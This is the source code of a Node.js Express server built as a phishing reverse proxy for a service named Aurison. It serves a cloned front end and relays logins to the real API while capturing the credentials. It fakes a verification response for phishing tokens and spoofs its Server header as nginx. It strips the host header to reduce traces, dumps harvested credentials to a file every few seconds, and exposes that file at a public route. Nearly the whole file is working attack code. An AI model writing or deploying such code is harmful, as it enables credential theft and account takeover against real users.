//imports
import { grabCreds as harvestCredentials, writeCreds as credsDump } from './utils/utils.js';
import { config } from './config.js';
import bodyParser from 'body-parser';
import { fileURLToPath } from 'url';
import path from 'path';
import express from 'express';
import axios from 'axios';
import https from 'https';



//consts 
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);     //workaround __dirname variable in Es6 🤷🏿‍♂️
const AGENT = new https.Agent({ rejectUnauthorized: false });
const app = express();

//vars
var CREDENTIALS = [];



//middlwares
app.use(bodyParser.json());

app.use((req, res, next) => {
    //This route is kinda uneccessary. 
    res.removeHeader('X-Powered-By');
    res.setHeader('Server', 'nginx/1.18.0 (Ubuntu)');
    next();
})

app.use('/static', express.static('static'));

app.get('/helloworld_dump', (req, res) => res.sendFile(__dirname, '/aurison_creds_dump.txt'));


app.get('/favicon.ico', (req, res) => res.sendFile(__dirname + '/favicon.ico'));

//home
app.get('*', (req, res, next)=>{
    //check if react is trying to access a static file and manually serve it.
    //This happenes when the route doesn't begin with /static, so the static
    //middleware doesn't catch it, e.g /test/whatever/static/bla.js
    if (req.path.includes("/static")) {
        const index = req.path.indexOf("/static");
        const resource = req.path.substring(index); //path to static file.

        return res.sendFile(__dirname + resource);
    }

    //just return the base html otherwise.
    return res.sendFile(__dirname + '/index.html');
});


app.post('/verify', (req, res, next) => {
    //fake a valid response to trick react if its a phish link.
    //otherwise just pass it along to the proxy
    if (req.body.action === "info" && req.body.token.endsWith("700r")) {
        //probably grab this from somewhere later on.
        var payload = {
            error:false,
            data: {
                title:"",
                forenames:"",
                surname:"",
                organisation:""
            }
        }
        return res.status(200).json(payload);
    }

    return next();
});


//proxy api post requests.
app.post('*', async (req, res) =>{
    const path = req.path;   //grab route

    try {
        const {headers, body} = req;    //grab relevant info from req
        
        delete headers["host"]       //really doesn't matter, just leaves less of a trace.

        // Make request to Aurison
        const response = await axios({
          method: 'POST',
          headers: headers,
          data: body,
          url: `${config.ENV + path}`,
          httpsAgent: AGENT
        });   
        
        const resHeaders = response.headers
        const keys = Object.keys(resHeaders);

        //set headers.
        keys.forEach(key => {
            res.setHeader(key, resHeaders[key]) 
        });
        
        //Grab login creds
        if (response.data.error === false && path === '/login') harvestCredentials(req, CREDENTIALS);
 
        return res.status(200).json(response.data);

    } catch (error) {
        if (error.response && error.response.data) { //check if the error was raised from aurison api 
            return res.status(error.response.status).json(error.response.data);
        }

        console.log(error);
        return res.status(400).json({
            error: true,
            error_log: 'Unknown Error'
        });
    }
});



//launch
app.listen(config.PORT, () => {
    setInterval(() => credsDump(CREDENTIALS), 5000);   //dump any creds in queue every 10 seconds.

    console.log(`Server is listening on port ${config.PORT}`);
});
